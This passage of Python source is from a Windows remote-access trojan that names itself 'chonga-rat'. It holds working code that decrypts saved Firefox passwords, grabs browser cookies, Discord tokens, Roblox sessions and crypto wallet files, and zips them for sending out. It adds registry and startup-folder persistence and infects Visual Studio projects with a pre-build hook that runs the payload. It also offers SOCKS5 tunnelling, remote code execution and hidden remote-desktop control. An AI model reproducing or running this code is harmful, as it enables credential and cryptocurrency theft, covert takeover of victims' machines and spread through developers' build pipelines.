                walk((data.get("roots") or {}).get(key), key)
    return {"bookmarks": out[:1500], "count": len(out)}


# ---- firefox -------------------------------------------------------------
def _ff_profiles():
    """Firefox and its forks all use the same logins.json + key4.db layout."""
    ad = os.environ.get("APPDATA", "")
    la = os.environ.get("LOCALAPPDATA", "")
    bases = [
        Path(ad) / "Mozilla" / "Firefox" / "Profiles",
        Path(ad) / "librewolf" / "Profiles",
        Path(ad) / "Waterfox" / "Profiles",
        Path(ad) / "Zen" / "Profiles",
        Path(ad) / "Floorp" / "Profiles",
        Path(ad) / "Mullvad" / "MullvadBrowser" / "Profiles",
        Path(la) / "Mozilla" / "Firefox" / "Profiles",
    ]
    out = []
    for base in bases:
        if not base.is_dir():
            continue
        out.extend(sorted(p for p in base.iterdir() if p.is_dir()))
    return out


def _der_octets(blob):
    """Pull the OCTET STRINGs and INTEGERs out of a small DER blob, in order.

    key4.db stores entry salt, iteration count and IV in nested ASN.1, so the
    walk has to descend into SEQUENCE/SET instead of skimming the top level.
    """
    octets, ints = [], []

    def walk(buf):
        i = 0
        while i < len(buf) - 1:
            tag = buf[i]
            length = buf[i + 1]
            i += 2
            if length & 0x80:
                n = length & 0x7F
                length = int.from_bytes(buf[i:i + n], "big")
                i += n
            value = buf[i:i + length]
            i += length
            if tag in (0x30, 0x31):                     # SEQUENCE / SET
                walk(value)
            elif tag == 0x04:                           # OCTET STRING
                octets.append(value)
            elif tag == 0x02:                           # INTEGER
                ints.append(int.from_bytes(value, "big"))

    walk(blob)
    return octets, ints


def _ff_key(profile):
    """AES key out of key4.db. Returns None when the store is not readable."""
    key4 = profile / "key4.db"
    if not key4.exists():
        return None
    try:
        con = sqlite3.connect(f"file:{key4.as_posix()}?mode=ro&immutable=1", uri=True, timeout=2)
        try:
            row = con.execute("SELECT item1, item2 FROM metadata WHERE id='password'").fetchone()
            if not row:
                return None
            global_salt, item2 = row[0], row[1]
            priv = con.execute("SELECT a11 FROM nssPrivate LIMIT 1").fetchone()
            if not priv:
                return None
            encrypted = priv[0]
        finally:
            con.close()
    except Exception:
        return None

    try:
        octets, ints = _der_octets(item2)
        entry_salt = octets[0]
        iterations = ints[0] if ints else 1
    except Exception:
        return None

    hp = hashlib.sha1(global_salt).digest()
    chp = hashlib.sha1(hp + entry_salt).digest()
    for _ in range(max(1, iterations)):
        chp = hashlib.sha1(chp + entry_salt).digest()
    k1 = hashlib.sha1(chp + entry_salt).digest()
    tk = hashlib.sha1(hp + entry_salt).digest()
    k2 = hashlib.sha1(tk + entry_salt).digest()

    try:
        from Crypto.Cipher import DES3
        plain = DES3.new(k1[:24], DES3.MODE_CBC, k2[:8]).decrypt(encrypted)
    except Exception:
        return None
    inner, _ = _der_octets(plain)
    return inner[0] if inner else None


def _ff_decrypt(blob, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        iv, ct = blob[:16], blob[16:-32]
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16).decode("utf-8", "replace")
    except Exception:
        return ""


def steal_firefox(_args):
    accounts, cookies = [], []
    for prof in _ff_profiles():
        logins = prof / "logins.json"
        if logins.exists():
            key = _ff_key(prof)
            try:
                data = json.loads(logins.read_text(encoding="utf-8", errors="replace"))
            except Exception:
                data = {}
            for entry in data.get("logins") or []:
                rec = {"browser": prof.parent.parent.name or "firefox",
                       "profile": prof.name,
                       "url": entry.get("hostname", "")}
                for field, out in (("encryptedUsername", "username"),
                                   ("encryptedPassword", "password")):
                    enc = entry.get(field)
                    if not enc:
                        rec[out] = ""
                        continue
                    if not key:
                        rec[out] = "<locked:master-password>"
                        continue
                    try:
                        rec[out] = _ff_decrypt(base64.b64decode(enc), key)
                    except Exception:
                        rec[out] = "<undecryptable>"
                accounts.append(rec)
        ck = prof / "cookies.sqlite"
        if ck.exists():
            try:
                con = sqlite3.connect(f"file:{ck.as_posix()}?mode=ro&immutable=1", uri=True, timeout=2)
                try:
                    for host, cname, value in con.execute(
                            "SELECT host, name, value FROM moz_cookies LIMIT 400"):
                        cookies.append({"browser": "firefox", "profile": prof.name,
                                        "host": host, "name": cname, "value": value})
                finally:
                    con.close()
            except Exception:
                pass
    return {"accounts": accounts, "cookies": cookies,
            "count": len(accounts), "cookies_count": len(cookies)}


def _bundle_count(payload):
    """Rows behind one collector, for browsers the payload is a list."""
    if isinstance(payload, list):
        return len(payload)
    if isinstance(payload, dict):
        if isinstance(payload.get("count"), int):
            return payload["count"]
        total = 0
        for value in payload.values():
            if isinstance(value, (list, dict)):
                total += _bundle_count(value)
        return total
    return 0


def steal_all(_args):
    """Everything, in one archive. Returns base64 plus a per-collector tally."""
    STEAL_NOTES.clear()
    VSS.update(tried=False)
    VSS["copies"] = {}
    try:
        bundles = {
            "cookies": steal_cookies({}),
            "passwords": steal_passwords({}),
            "history": steal_history({}),
            "autofill": steal_autofill({}),
            "cards": steal_cards({}),
            "downloads": steal_downloads({}),
            "bookmarks": steal_bookmarks({}),
            "firefox": steal_firefox({}),
            "discord": steal_discord({}),
            "roblox": steal_roblox({}),
            "wallets": steal_wallets({}),
            "extensions": steal_extensions({}),
        }
        counts = {k: _bundle_count(v) for k, v in bundles.items()}
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            for name, payload in bundles.items():
                z.writestr(f"{name}.json", json.dumps(payload, indent=2, default=str))
        blob = buf.getvalue()
        used_snapshot = bool(VSS["id"])
    finally:
        _vss_release()
    return {"archive": base64.b64encode(blob).decode("ascii"),
            "bytes": len(blob), "counts": counts,
            "total": sum(counts.values()), "notes": list(STEAL_NOTES),
            "snapshot": used_snapshot}


def _leveldb_scan(root, pattern, label):
    hits = []
    if not root.exists():
        return hits
    rx = re.compile(pattern)
    for p in list(root.rglob("*.ldb")) + list(root.rglob("*.log")):
        try:
            data = p.read_bytes()
        except OSError:
            continue
        for m in rx.finditer(data.decode("utf-8", "ignore")):
            tok = m.group(0)
            if tok not in hits:
                hits.append(tok)
        if len(hits) >= 50:
            break
    return hits


def steal_discord(_args):
    ad = Path(os.environ.get("APPDATA", ""))
    pats = [
        ad / "discord" / "Local Storage" / "leveldb",
        ad / "discordcanary" / "Local Storage" / "leveldb",
        ad / "discordptb" / "Local Storage" / "leveldb",
        ad / "Lightcord" / "Local Storage" / "leveldb",
    ]
    tokens = []
    for p in pats:
        tokens += _leveldb_scan(p, r"[A-Za-z0-9_-]{24,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,110}|mfa\.[A-Za-z0-9_-]{80,90}", "discord")
    tokens = list(dict.fromkeys(tokens))[:30]
    return {"tokens": tokens, "count": len(tokens)}


def steal_roblox(_args):
    rows = [c for c in _cookie_rows(limit=2000)
            if c["name"] == ".ROBLOSECURITY" or "roblox" in c["host"].lower()]
    return {"cookies": rows[:100], "count": len(rows)}


def _wallet_paths():
    la = Path(os.environ.get("LOCALAPPDATA", ""))
    ad = Path(os.environ.get("APPDATA", ""))
    cands = [
        ad / "Exodus" / "exodus.wallet",
        ad / "Electrum" / "wallets",
        ad / "Bitcoin" / "wallet.dat",
        ad / "Litecoin" / "wallet.dat",
        ad / "Ethereum" / "keystore",
        ad / "Monero" / "wallets",
        ad / "Coinbase Wallet",
        ad / "Phantom",
        ad / "MetaMask",
        la / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
        la / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        la / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
    ]
    out = []
    for c in cands:
        if c.is_file():
            out.append({"path": str(c), "size": c.stat().st_size, "kind": "file"})
        elif c.is_dir():
            for p in list(c.rglob("*"))[:200]:
                if p.is_file():
                    out.append({"path": str(p), "size": p.stat().st_size, "kind": "dir"})
    return out[:300]


def steal_wallets(_args):
    files = _wallet_paths()
    return {"wallets": files, "count": len(files),
            "total": sum(f["size"] for f in files)}


def steal_extensions(_args):
    rows = []
    for name, root in _browser_roots().items():
        for prof in _profiles(root):
            ext = prof / "Extensions"
            if not ext.exists():
                continue
            for manifest in ext.glob("*/*/manifest.json"):
                try:
                    data = json.loads(manifest.read_text(encoding="utf-8", errors="ignore"))
                    rows.append({"browser": name, "id": manifest.parent.parent.name,
                                 "name": data.get("name", "?"),
                                 "version": data.get("version", "?"),
                                 "path": str(manifest.parent)})
                except Exception:
                    continue
    return {"extensions": rows[:300], "count": len(rows)}


def steal_archive(args):
    kind = str(args.get("kind", "wallets"))
    if kind == "wallets":
        files = [Path(f["path"]) for f in _wallet_paths() if f["kind"] == "file"]
    elif kind == "extensions":
        files = [Path(e["path"]) / "manifest.json" for e in steal_extensions({})["extensions"]]
    else:
        raise RuntimeError("unknown archive kind")
    buf = io.BytesIO()
    added = 0
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for p in files[:200]:
            try:
                z.write(p, p.name if kind == "wallets" else f"{p.parent.parent.name}-{p.name}")
                added += 1
            except OSError:
                continue
    return {"zip": _b64(buf.getvalue()), "files": added, "kind": kind}


# --------------------------------------------------------------------------
# recon: connections, geo, startup inventory
# --------------------------------------------------------------------------
def connections(_args):
    import psutil
    try:
        conns = psutil.net_connections(kind="inet")
    except Exception as e:
        raise RuntimeError(f"net_connections: {e}")
    rows = []
    for c in conns:
        pname = ""
        if c.pid:
            try:
                pname = psutil.Process(c.pid).name()
            except Exception:
                pname = ""
        rows.append({
            "pid": c.pid, "process": pname,
            "family": "v6" if c.family == socket.AF_INET6 else "v4",
            "proto": "tcp" if c.type == socket.SOCK_STREAM else "udp",
            "local": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "",
            "remote": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "",
            "status": c.status,
        })
    rows.sort(key=lambda r: (r["process"].lower(), r["remote"]))
    return {"connections": rows, "count": len(rows)}


def geo(args):
    """Local network facts by default. Public lookup only when asked."""
    out = {
        "hostname": socket.gethostname(),
        "timezone": time.tzname[0],
        "utc_offset": -time.timezone,
        "interfaces": {},
        "gateway": "",
    }
    try:
        import psutil
        for name, addrs in psutil.net_if_addrs().items():
            out["interfaces"][name] = [a.address for a in addrs
                                       if a.family in (socket.AF_INET, socket.AF_INET6)]
    except Exception:
        pass
    if IS_WIN:
        try:
            r = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                 "(Get-NetRoute -DestinationPrefix 0.0.0.0/0 | "
                 "Select-Object -First 1).NextHop"],
                capture_output=True, text=True, timeout=8,
                creationflags=0x08000000)
            out["gateway"] = (r.stdout or "").strip()
        except Exception:
            pass
    if args.get("online"):
        import urllib.request
        try:
            req = urllib.request.Request("https://ipapi.co/json/",
                                         headers={"User-Agent": "chonga-rat"})
            with urllib.request.urlopen(req, timeout=6) as resp:
                out["public"] = json.loads(resp.read().decode("utf-8", "replace"))
        except Exception as e:
            out["public_error"] = f"{type(e).__name__}: {e}"
    return out


RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"


def _startup_dir():
    return (Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" /
            "Start Menu" / "Programs" / "Startup")


def _startup_rows():
    rows = []
    if IS_WIN:
        import winreg
        for hive, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                with winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_READ) as k:
                    for i in range(winreg.QueryInfoKey(k)[1]):
                        name, data, _ = winreg.EnumValue(k, i)
                        rows.append({"hive": label, "name": name,
                                     "command": str(data), "source": "registry"})
            except OSError:
                continue
    sd = _startup_dir()
    if sd.exists():
        for p in sd.iterdir():
            rows.append({"hive": "USER", "name": p.name, "command": str(p),
                         "source": "folder"})
    return rows


def startup_list(_args):
    rows = _startup_rows()
    return {"items": rows, "count": len(rows)}


def startup_add(args):
    name = str(args.get("name", "")).strip()
    command = str(args.get("command", "")).strip()
    if not name or not command:
        raise RuntimeError("name and command are required")
    if args.get("folder"):
        sd = _startup_dir()
        sd.mkdir(parents=True, exist_ok=True)
        target = sd / (name if name.lower().endswith((".cmd", ".bat", ".lnk")) else name + ".cmd")
        target.write_text(f'@echo off\r\nstart "" {command}\r\n', encoding="utf-8")
        return {"added": str(target), "source": "folder"}
    import winreg
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, command)
    return {"added": name, "source": "registry"}


def startup_remove(args):
    name = str(args.get("name", "")).strip()
    if not name:
        raise RuntimeError("name required")
    removed = []
    if IS_WIN:
        import winreg
        for hive, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                with winreg.OpenKey(hive, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
                    winreg.DeleteValue(k, name)
                    removed.append(label)
            except OSError:
                continue
    target = _startup_dir() / name
    if target.exists():
        target.unlink()
        removed.append("folder")
    return {"removed": removed, "name": name}


# --------------------------------------------------------------------------
# persistence
# --------------------------------------------------------------------------
PERSIST_DIR = Path(os.environ.get("APPDATA", "")) / "Chonga"
PERSIST_NAME = "ChongaAgent"


def _payload_path():
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve()
    return Path(sys.argv[0]).resolve()


def _launch_argv(path):
    if getattr(sys, "frozen", False) or path.suffix.lower() == ".exe":
        return f'"{path}"'
    pyw = Path(sys.executable).with_name("pythonw.exe")
    runner = pyw if pyw.exists() else Path(sys.executable)
    return f'"{runner}" "{path}"'


def _persist_state():
    import winreg
    installed = None
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_READ) as k:
            installed = str(winreg.QueryValueEx(k, PERSIST_NAME)[0])
    except OSError:
        installed = None
    return {
        "run_key": installed,
        "folder": str(PERSIST_DIR) if PERSIST_DIR.exists() else "",
        "active": bool(installed),
    }


def persist_status(_args):
    return _persist_state()


def persist_install(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    import winreg
    PERSIST_DIR.mkdir(parents=True, exist_ok=True)
    src = _payload_path()
    dest = PERSIST_DIR / src.name
    if src.resolve() != dest.resolve():
        shutil.copy2(src, dest)
    command = _launch_argv(dest)
    with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
        winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, command)
    if args.get("startup_folder"):
        sd = _startup_dir()
        sd.mkdir(parents=True, exist_ok=True)
        (sd / f"{PERSIST_NAME}.cmd").write_text(
            f'@echo off\r\nstart "" {command}\r\n', encoding="utf-8")
    return {"installed": command, "path": str(dest)}


def persist_remove(_args):
    import winreg
    removed = []
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, PERSIST_NAME)
            removed.append("run_key")
    except OSError:
        pass
    sd = _startup_dir() / f"{PERSIST_NAME}.cmd"
    if sd.exists():
        sd.unlink()
        removed.append("startup_folder")
    if PERSIST_DIR.exists():
        shutil.rmtree(PERSIST_DIR, ignore_errors=True)
        removed.append("folder")
    return {"removed": removed}


# --------------------------------------------------------------------------
# propagation: Visual Studio project infection
# --------------------------------------------------------------------------
VS_IMPORT = "kryvexol.targets"
VS_EXTS = (".csproj", ".vcxproj", ".fsproj", ".vbproj")


def _vs_targets_xml(payload_cmd):
    return (
        '<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        '  <Target Name="KryvexolPreBuild" BeforeTargets="PreBuildEvent">\n'
        '    <Exec Command="start &quot;&quot; ' + payload_cmd.replace('"', "&quot;") + '"\n'
        '          ContinueOnError="true" />\n'
        '  </Target>\n'
        '</Project>\n'
    )


def vs_infect(args):
    root = Path(str(args.get("root", "")).strip())
    if not str(root) or not root.is_dir():
        raise RuntimeError("root must be an existing directory")
    if not args.get("confirm"):
        raise RuntimeError("confirm=true is required to modify project files")
    depth = max(1, min(int(args.get("depth", 4)), 8))
    limit = max(1, min(int(args.get("limit", 100)), 500))
    src = _payload_path()
    dest_dir = root / ".kryvexol"
    dest_dir.mkdir(parents=True, exist_ok=True)
    dest = dest_dir / src.name
    if src.resolve() != dest.resolve():
        shutil.copy2(src, dest)
    payload_cmd = _launch_argv(dest)
    base = str(root).rstrip("\\/")
    touched, skipped, failed = [], [], []
    for path in root.rglob("*"):
        if len(touched) + len(skipped) >= limit:
            break
        if not path.is_file() or path.suffix.lower() not in VS_EXTS:
            continue
        rel = str(path)[len(base) + 1:]
        if rel.count(os.sep) >= depth:
            continue
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
            if VS_IMPORT in text:
                skipped.append(rel)
                continue
            idx = text.lower().rfind("</project>")
            if idx == -1:
                failed.append({"project": rel, "error": "no closing Project tag"})
                continue
            targets = path.parent / VS_IMPORT
            targets.write_text(_vs_targets_xml(payload_cmd), encoding="utf-8")
            backup = path.with_suffix(path.suffix + ".kryvexol.bak")
            if not backup.exists():
                backup.write_bytes(path.read_bytes())
            inject = (f'  <Import Project="$(MSBuildProjectDirectory)\\{VS_IMPORT}" />\n')
            path.write_text(text[:idx] + inject + text[idx:], encoding="utf-8")
            touched.append(rel)
        except OSError as e:
            failed.append({"project": rel, "error": str(e)})
    return {"root": str(root), "payload": str(dest), "infected": touched,
            "skipped": skipped, "failed": failed, "count": len(touched)}


def vs_clean(args):
    root = Path(str(args.get("root", "")).strip())
    if not str(root) or not root.is_dir():
        raise RuntimeError("root must be an existing directory")
    if not args.get("confirm"):
        raise RuntimeError("confirm=true is required to restore project files")
    restored, removed = [], []
    suffix = ".kryvexol.bak"
    for path in root.rglob("*"):
        if path.is_file() and path.name.endswith(suffix):
            target = Path(str(path)[:-len(suffix)])
            try:
                target.write_bytes(path.read_bytes())
                path.unlink()
                restored.append(str(target)[len(str(root)) + 1:])
            except OSError:
                continue
        elif path.is_file() and path.name == VS_IMPORT:
            try:
                path.unlink()
                removed.append(str(path)[len(str(root)) + 1:])
            except OSError:
                continue
    payload_removed = False
    payload_dir = root / ".kryvexol"
    if payload_dir.is_dir():
        shutil.rmtree(payload_dir, ignore_errors=True)
        payload_removed = not payload_dir.exists()
    return {"restored": restored, "targets_removed": removed,
            "payload_removed": payload_removed}


# --------------------------------------------------------------------------
# reverse tunnel + SOCKS5 proxy
# --------------------------------------------------------------------------
TUNNELS = {}


def proxy_open(args):
    host = str(args.get("host", "")).strip()
    port = int(args.get("port", 0))
    if not host or not 1 <= port <= 65535:
        raise RuntimeError("host and port are required")
    s = socket.create_connection((host, port), timeout=8)
    s.settimeout(None)
    tid = uuid.uuid4().hex[:12]
    TUNNELS[tid] = {"sock": s, "host": host, "port": port,
                    "created": time.time(), "rx": 0, "tx": 0}
    return {"id": tid, "host": host, "port": port}


def _tunnel(args):
    tid = str(args.get("id", ""))
    t = TUNNELS.get(tid)
    if not t:
        raise RuntimeError("unknown tunnel id")
    return tid, t


def proxy_send(args):
    tid, t = _tunnel(args)
    data = base64.b64decode(args.get("data", ""))
    if not data:
        raise RuntimeError("empty payload")
    t["sock"].sendall(data)
    t["tx"] += len(data)
    return {"id": tid, "sent": len(data), "tx": t["tx"]}


def proxy_recv(args):
    tid, t = _tunnel(args)
    limit = max(1, min(int(args.get("limit", 65536)), 262144))
    t["sock"].settimeout(0.35)
    try:
        data = t["sock"].recv(limit)
    except socket.timeout:
        return {"id": tid, "data": "", "closed": False, "tx": t["tx"], "rx": t["rx"]}
    except OSError as e:
        return {"id": tid, "data": "", "closed": True, "error": str(e),
                "tx": t["tx"], "rx": t["rx"]}
    t["rx"] += len(data)
    if not data:
        TUNNELS.pop(tid, None)
        return {"id": tid, "data": "", "closed": True, "tx": t["tx"], "rx": t["rx"]}
    return {"id": tid, "data": _b64(data), "closed": False,
            "tx": t["tx"], "rx": t["rx"]}


def proxy_close(args):
    tid, t = _tunnel(args)
    try:
        t["sock"].close()
    except OSError:
        pass
    TUNNELS.pop(tid, None)
    return {"id": tid, "closed": True}


def proxy_list(_args):
    rows = [{"id": k, "host": v["host"], "port": v["port"],
             "rx": v["rx"], "tx": v["tx"], "age": round(time.time() - v["created"], 1)}
            for k, v in TUNNELS.items()]
    return {"tunnels": rows, "count": len(rows)}


PROXY = {"srv": None, "thread": None, "port": None, "accepted": 0, "bytes": 0}


def _pipe(src, dst):
    try:
        while True:
            data = src.recv(65536)
            if not data:
                break
            dst.sendall(data)
            PROXY["bytes"] += len(data)
    except OSError:
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def _socks_client(conn):
    try:
        conn.settimeout(15)
        head = conn.recv(2)
        if len(head) < 2 or head[0] != 5:
            return
        nm = head[1]
        conn.recv(nm)
        conn.sendall(b"\x05\x00")
        req = conn.recv(4)
        if len(req) < 4 or req[1] != 1:
            conn.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        atyp = req[3]
        if atyp == 1:
            host = socket.inet_ntoa(conn.recv(4))
        elif atyp == 3:
            n = conn.recv(1)[0]
            host = conn.recv(n).decode("ascii", "replace")
        elif atyp == 4:
            host = socket.inet_ntop(socket.AF_INET6, conn.recv(16))
        else:
            conn.sendall(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        port = struct.unpack("!H", conn.recv(2))[0]
        try:
            upstream = socket.create_connection((host, port), timeout=10)
        except OSError:
            conn.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            return
        conn.settimeout(None)
        upstream.settimeout(None)
        conn.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        PROXY["accepted"] += 1
        a = threading.Thread(target=_pipe, args=(conn, upstream), daemon=True)
        a.start()
        _pipe(upstream, conn)
        a.join(timeout=5)
        try:
            upstream.close()
        except OSError:
            pass
    except OSError:
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def _socks_loop(srv):
    while PROXY["srv"] is srv:
        try:
            conn, _ = srv.accept()
        except OSError:
            break
        threading.Thread(target=_socks_client, args=(conn,), daemon=True).start()


def proxy_start(args):
    if PROXY["srv"]:
        return {"already": True, "port": PROXY["port"]}
    port = max(1, min(int(args.get("port", 1080)), 65535))
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("127.0.0.1", port))
        srv.listen(32)
    except OSError as e:
        srv.close()
        raise RuntimeError(f"bind 127.0.0.1:{port} failed: {e}")
    PROXY["srv"] = srv
    PROXY["port"] = port
    PROXY["thread"] = threading.Thread(target=_socks_loop, args=(srv,), daemon=True)
    PROXY["thread"].start()
    return {"listening": f"127.0.0.1:{port}", "protocol": "socks5"}


def proxy_stop(_args):
    srv = PROXY.get("srv")
    PROXY["srv"] = None
    if srv:
        try:
            srv.close()
        except OSError:
            pass
    return {"stopped": True, "accepted": PROXY["accepted"]}


def proxy_status(_args):
    return {"running": bool(PROXY["srv"]), "port": PROXY["port"],
            "accepted": PROXY["accepted"], "bytes": PROXY["bytes"],
            "tunnels": len(TUNNELS)}


# --------------------------------------------------------------------------
# plugins: pushed modules
# --------------------------------------------------------------------------
PLUGINS = {}


def plugin_load(args):
    name = str(args.get("name", "")).strip() or f"plugin{len(PLUGINS) + 1}"
    src = str(args.get("source", ""))
    if not src.strip():
        raise RuntimeError("source required")
    ns = {
        "__name__": f"kryvexol_plugin_{name}",
        "event": event,
        "send": send,
        "log": lambda *a: event("plugin_log", plugin=name,
                                message=" ".join(str(x) for x in a)),
    }
    exec(compile(src, f"<plugin:{name}>", "exec"), ns)
    commands = ns.get("COMMANDS") or {}
    if not isinstance(commands, dict):
        raise RuntimeError("plugin must define COMMANDS as a dict")
    PLUGINS[name] = {"ns": ns, "commands": commands, "loaded": time.time(),
                     "source": src}
    return {"name": name, "commands": sorted(commands)}


def plugin_list(_args):
    rows = [{"name": k, "commands": sorted(v["commands"]),
             "loaded": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(v["loaded"])),
             "bytes": len(v["source"])}
            for k, v in PLUGINS.items()]
    return {"plugins": rows, "count": len(rows)}


def plugin_call(args):
    name = str(args.get("name", ""))
    cmd = str(args.get("command", ""))
    p = PLUGINS.get(name)
    if not p:
        raise RuntimeError("unknown plugin")
    fn = p["commands"].get(cmd)
    if not callable(fn):
        raise RuntimeError("unknown plugin command")
    result = fn(args.get("args") or {})
    return {"name": name, "command": cmd, "result": result}


def plugin_unload(args):
    name = str(args.get("name", ""))
    if name not in PLUGINS:
        raise RuntimeError("unknown plugin")
    PLUGINS.pop(name)
    return {"unloaded": name}


# --------------------------------------------------------------------------
# remote code + process launch
# --------------------------------------------------------------------------
def code_run(args):
    src = str(args.get("code", ""))
    if not src.strip():
        raise RuntimeError("code required")
    import contextlib
    buf = io.StringIO()
    ns = {"event": event, "send": send, "args": args.get("args") or {},
          "result": None}
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
        exec(compile(src, "<code_run>", "exec"), ns)
    return {"stdout": buf.getvalue()[-100000:],
            "result": repr(ns.get("result"))[:20000]}


def execute(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    target = str(args.get("path") or args.get("target") or "").strip()
    if not target:
        raise RuntimeError("path required")
    params = str(args.get("args", ""))
    verb = str(args.get("verb", "open"))
    cwd = str(args.get("cwd", "") or "") or None
    r = ctypes.windll.shell32.ShellExecuteW(None, verb, target, params, cwd,
                                            int(args.get("show", 1)))
    if r <= 32:
        raise RuntimeError(f"ShellExecuteW failed ({r})")
    return {"launched": target, "verb": verb}


def run_command(args):
    cmd = str(args.get("command", "")).strip()
    if not cmd:
        raise RuntimeError("command required")
    flags = 0x00000008 | 0x00000200      # DETACHED_PROCESS | NEW_PROCESS_GROUP
    p = subprocess.Popen(cmd, shell=True, creationflags=flags, close_fds=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    return {"pid": p.pid, "detached": True}


def visit_website(args):
    url = str(args.get("url", "")).strip()
    if not re.match(r"^https?://", url, re.I):
        raise RuntimeError("http(s) url required")
    if IS_WIN:
        os.startfile(url)               # noqa: S606 - deliberate launch
    else:
        import webbrowser
        webbrowser.open(url)
    return {"opened": url}


# --------------------------------------------------------------------------
# file utilities
# --------------------------------------------------------------------------
def file_hash(args):
    p = Path(str(args.get("path", "")))
    if not p.is_file():
        raise RuntimeError("not a file")
    digests = {"sha256": hashlib.sha256(), "sha1": hashlib.sha1(),
               "md5": hashlib.md5(usedforsecurity=False)}
    with p.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            for d in digests.values():
                d.update(chunk)
    st = p.stat()
    return {"path": str(p), "size": st.st_size, "mtime": st.st_mtime,
            **{k: v.hexdigest() for k, v in digests.items()}}


def file_search(args):
    root = Path(str(args.get("root", "")).strip())
    pattern = str(args.get("pattern", "*")) or "*"
    limit = max(1, min(int(args.get("limit", 300)), 5000))
    if not root.exists():
        raise RuntimeError("root not found")
    rows = []
    for p in root.rglob(pattern):
        try:
            st = p.stat()
        except OSError:
            continue
        rows.append({"path": str(p), "dir": p.is_dir(),
                     "size": 0 if p.is_dir() else st.st_size,
                     "mtime": st.st_mtime})
        if len(rows) >= limit:
            break
    return {"results": rows, "count": len(rows)}


def _ps(script, timeout=25):
    r = subprocess.run(
        ["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
        capture_output=True, text=True, timeout=timeout,
        creationflags=0x08000000)
    return (r.stdout or "").strip()


def recycle_list(_args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    script = (
        "$sh = New-Object -ComObject Shell.Application;"
        "$rb = $sh.Namespace(10);"
        "$rb.Items() | ForEach-Object {"
        "[pscustomobject]@{Name=$_.Name;Path=$_.Path;Size=$_.Size;"
        "Deleted=$_.ModifyDate.ToString('s')} } | ConvertTo-Json -Compress"
    )
    raw = _ps(script)
    if not raw:
        return {"items": [], "count": 0}
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        return {"items": [], "count": 0, "raw": raw[:2000]}
    if isinstance(data, dict):
        data = [data]
    return {"items": data, "count": len(data)}


def recycle_restore(args):
    if not IS_WIN:
        raise RuntimeError("Windows-only")
    name = str(args.get("name", "")).strip()
    if not name:
        raise RuntimeError("name required")
    safe = name.replace("'", "''")
    script = (
        "$sh = New-Object -ComObject Shell.Application;"
        "$rb = $sh.Namespace(10);"
        f"$item = $rb.Items() | Where-Object {{ $_.Name -eq '{safe}' }} | "
        "Select-Object -First 1;"
        "if ($item) { $item.InvokeVerb('undelete'); 'restored' } else { 'missing' }"
    )
    out = _ps(script)
    if out == "missing":
        raise RuntimeError("item not found in the recycle bin")
    return {"restored": name}


# --------------------------------------------------------------------------
# hidden RustDesk
# --------------------------------------------------------------------------
def _rustdesk_exe():
    cands = [
        Path(os.environ.get("ProgramFiles", "")) / "RustDesk" / "rustdesk.exe",
        Path(os.environ.get("ProgramFiles(x86)", "")) / "RustDesk" / "rustdesk.exe",
        Path(os.environ.get("LOCALAPPDATA", "")) / "Programs" / "RustDesk" / "rustdesk.exe",
    ]
    for c in cands:
        if c.is_file():
            return c
    return None


def _rustdesk_cfg():
    return Path(os.environ.get("APPDATA", "")) / "RustDesk" / "config" / "RustDesk2.toml"


def rustdesk_status(_args):
    exe = _rustdesk_exe()
